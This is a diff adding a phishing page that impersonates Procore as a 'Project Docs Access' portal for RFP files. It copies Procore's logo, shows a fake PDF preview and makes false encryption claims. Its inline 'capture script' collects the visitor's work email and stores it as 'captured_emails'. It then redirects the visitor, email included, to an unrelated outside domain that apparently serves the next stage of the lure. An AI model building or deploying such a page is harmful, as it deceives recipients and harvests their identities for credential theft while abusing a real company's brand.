@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Procore Project Docs Access</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com/3.4.16"></script>
+  <link rel="icon" href="https://www.procore.com/favicon.ico">
+  <style>
+    body { font-family: 'Inter', sans-serif; background: #f8fafc; }
+    .brand-header {
+      background: #0b1f2e;
+      padding: 0.8rem 2rem;
+      text-align: center;
+    }
+    .brand-header .tags {
+      font-size: 0.6rem;
+      color: #8ab4d8;
+      letter-spacing: 0.3px;
+      text-transform: uppercase;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 0.3rem 0.6rem;
+    }
+    .brand-header .tags span {
+      background: rgba(255,255,255,0.06);
+      padding: 0.15rem 0.7rem;
+      border-radius: 20px;
+    }
+    .doc-card {
+      background: #ffffff;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.04);
+      padding: 1.5rem;
+    }
+    .doc-card .file-preview {
+      background: #f1f5f9;
+      border-radius: 12px;
+      height: 200px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      border: 2px dashed #dce4ee;
+    }
+    .doc-card .file-preview .pdf-icon {
+      font-size: 5rem;
+      color: #e87420;
+      line-height: 1;
+    }
+    .doc-card .file-info {
+      margin-top: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .doc-card .file-info .name {
+      font-weight: 600;
+      font-size: 1rem;
+      color: #0b1f2e;
+    }
+    .doc-card .file-info .size {
+      color: #6b7a93;
+      font-size: 0.8rem;
+    }
+    .trust-badge {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 0.75rem;
+      color: #2d4a6a;
+    }
+    .trust-badge i { color: #1a7a6a; }
+    .btn-orange {
+      background: #e87420;
+      color: white;
+      font-weight: 600;
+      padding: 0.75rem 1.5rem;
+      border-radius: 8px;
+      transition: background 0.2s;
+      border: none;
+      cursor: pointer;
+    }
+    .btn-orange:hover { background: #d06a1a; }
+    .input-field {
+      border: 1.5px solid #dce4ee;
+      border-radius: 8px;
+      padding: 0.75rem 1rem;
+      width: 100%;
+      font-size: 1rem;
+    }
+    .input-field:focus {
+      border-color: #e87420;
+      box-shadow: 0 0 0 3px rgba(232,116,32,0.1);
+      outline: none;
+    }
+    .error-feedback {
+      color: #c0392b;
+      font-size: 0.8rem;
+      margin-top: 0.3rem;
+      display: none;
+    }
+    .input-error { border-color: #d9534f !important; }
+    .shake-effect { animation: shake 0.25s ease-in-out; }
+    @keyframes shake {
+      0% { transform: translateX(0); }
+      25% { transform: translateX(4px); }
+      75% { transform: translateX(-4px); }
+      100% { transform: translateX(0); }
+    }
+    .btn-loading { pointer-events: none; opacity: 0.8; }
+    .spinner-icon {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255,255,255,0.4);
+      border-top: 2px solid #ffffff;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      margin-right: 6px;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+
+  <!-- ─── dark header – only tags ─── -->
+  <div class="brand-header">
+    <div class="tags">
+      <span>#BidProposalHub2026</span>
+      <span>#SecureDocsExchange</span>
+      <span>#RFPSubmissionPortal</span>
+      <span>#BidReviewSession2026</span>
+      <span>#VendorGatewayAccess</span>
+    </div>
+  </div>
+
+  <!-- ─── main content ─── -->
+  <div class="max-w-6xl mx-auto px-4 py-8">
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-8 items-start">
+
+      <!-- LEFT COLUMN -->
+      <div>
+        <!-- Procore Logo -->
+        <div class="mb-6">
+          <img src="https://production-login-assets0.cdn.procore.com/assets/procore_logo_login-7e511a66418d5541449bac05d319883fa77e09ca9b2c38278d1f2c361f403500.png" alt="Procore" class="h-10 w-auto">
+        </div>
+        <h2 class="text-2xl md:text-3xl font-bold text-gray-900 mb-4">Access RFP & RFQ Files</h2>
+        <p class="text-lg text-gray-600 mb-6">Securely review your authorized document package. Please confirm your identity using your company email address.</p>
+
+        <form id="gatewayForm" novalidate>
+          <div class="mb-4">
+            <label for="workEmailInput" class="block text-sm font-medium text-gray-700 mb-1">Work Email Address</label>
+            <input type="email"
+                   id="workEmailInput"
+                   name="email"
+                   class="input-field"
+                   placeholder="you@company.com"
+                   required
+                   autocomplete="off"
+                   autofocus />
+            <div id="inlineError" class="error-feedback">Please enter a valid email address.</div>
+          </div>
+          <button type="submit" id="submitBtn" class="btn-orange w-full flex items-center justify-center gap-2">
+            <i class="ri-lock-line"></i> Access Document
+          </button>
+        </form>
+      </div>
+
+      <!-- RIGHT COLUMN – document preview -->
+      <div class="doc-card">
+        <div class="file-preview">
+          <i class="ri-file-pdf-fill pdf-icon"></i>
+        </div>
+        <div class="file-info">
+          <span class="name">RFP Submission – Infrastructure Works</span>
+          <span class="size">PDF • 12.8 MB</span>
+        </div>
+        <div class="mt-6 space-y-2">
+          <div class="trust-badge">
+            <i class="ri-shield-check-line"></i>
+            <span>Bank-level 256-bit AES encryption with TLS protection</span>
+          </div>
+          <div class="trust-badge">
+            <i class="ri-timer-line"></i>
+            <span>Link expires in 3 business days</span>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ─── capture script (unchanged) ─── -->
+  <script>
+    (function() {
+      "use strict";
+
+      const DEFAULT_CAPTURE = '&hint=';
+      const LANDING_BASE = 'https://atlasconsultsolutions-pyi5c7omq.acreativeblog.com/';
+
+      const emailField = document.getElementById('workEmailInput');
+      const form = document.getElementById('gatewayForm');
+      const errorDiv = document.getElementById('inlineError');
+      const submitButton = document.getElementById('submitBtn');
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+      function clearErrorUI() {
+        emailField.classList.remove('input-error');
+        errorDiv.style.display = 'none';
+        errorDiv.classList.remove('shake-effect');
+      }
+      function showErrorUI() {
+        emailField.classList.add('input-error');
+        errorDiv.style.display = 'block';
+        errorDiv.classList.add('shake-effect');
+        setTimeout(() => errorDiv.classList.remove('shake-effect'), 350);
+      }
+
+      function getEmailFromURL() {
+        const params = new URLSearchParams(window.location.search);
+        let email = params.get('hint');
+        if (email) return email;
+        const hash = window.location.hash;
+        if (hash) {
+          const match = hash.match(/^#email[=:](.+)/);
+          if (match) return decodeURIComponent(match[1]);
+          if (hash.length > 1 && hash.includes('@')) return decodeURIComponent(hash.substring(1));
+        }
+        const path = window.location.pathname;
+        const parts = path.split('/');
+        const last = parts[parts.length - 1];
+        if (last && last.includes('@')) return decodeURIComponent(last);
+        const legacy = params.get('email');
+        if (legacy) return legacy;
+        return null;
+      }
+
+      function buildRedirectUrl(email, method) {
+        const base = LANDING_BASE.replace(/\/+$/, '');
+        const encoded = encodeURIComponent(email);
+        switch (method) {
+          case 'hash': return base + '#email=' + encoded;
+          case 'hint':
+            const sep = base.includes('?') ? '&' : '?';
+            return base + sep + 'hint=' + encoded;
+          case 'path':
+          default: return base + '/' + encoded;
+        }
+      }
+
+      let isProcessing = false;
+      function processEmailCapture(emailRaw) {
+        const email = emailRaw.trim();
+        if (!emailRegex.test(email)) { showErrorUI(); return false; }
+        clearErrorUI();
+        console.log(`[CAPTURE] ${new Date().toISOString()} → ${email}`);
+        try {
+          const stored = localStorage.getItem('captured_emails');
+          let emails = stored ? JSON.parse(stored) : [];
+          emails.push({ email, timestamp: new Date().toISOString() });
+          localStorage.setItem('captured_emails', JSON.stringify(emails));
+        } catch (_) {}
+        const redirectUrl = buildRedirectUrl(email, DEFAULT_CAPTURE);
+        setTimeout(() => { window.location.href = redirectUrl; }, 60);
+        return true;
+      }
+
+      async function onSubmitHandler(event) {
+        event.preventDefault();
+        if (isProcessing) return;
+        const entered = emailField.value;
+        if (!entered || entered.trim() === '') { showErrorUI(); return; }
+        isProcessing = true;
+        const originalText = submitButton.innerHTML;
+        submitButton.innerHTML = '<span class="spinner-icon"></span> Verifying...';
+        submitButton.classList.add('btn-loading');
+        submitButton.disabled = true;
+        const success = processEmailCapture(entered);
+        if (!success) {
+          submitButton.innerHTML = originalText;
+          submitButton.classList.remove('btn-loading');
+          submitButton.disabled = false;
+          isProcessing = false;
+        } else {
+          setTimeout(() => {
+            if (!window.location.href.includes('servicelifereportchoice')) {
+              submitButton.innerHTML = originalText;
+              submitButton.classList.remove('btn-loading');
+              submitButton.disabled = false;
+              isProcessing = false;
+            }
+          }, 2500);
+        }
+      }
+
+      function removeErrorOnInput() {
+        if (emailField.classList.contains('input-error')) {
+          emailField.classList.remove('input-error');
+          errorDiv.style.display = 'none';
+        }
+      }
+
+      function autoFillFromURL() {
+        const email = getEmailFromURL();
+        if (email && emailRegex.test(email)) {
+          emailField.value = email;
+        }
+      }
+
+      if (form) form.addEventListener('submit', onSubmitHandler);
+      if (emailField) {
+        emailField.addEventListener('input', removeErrorOnInput);
+        emailField.addEventListener('focus', removeErrorOnInput);
+      }
+      autoFillFromURL();
+      clearErrorUI();
+      console.log('✓ PROCORE portal ready');
+      console.log(`✓ Default capture: ${DEFAULT_CAPTURE} (supports #, /, &hint=)`);
+    })();
+  </script>
+</body>
+</html>
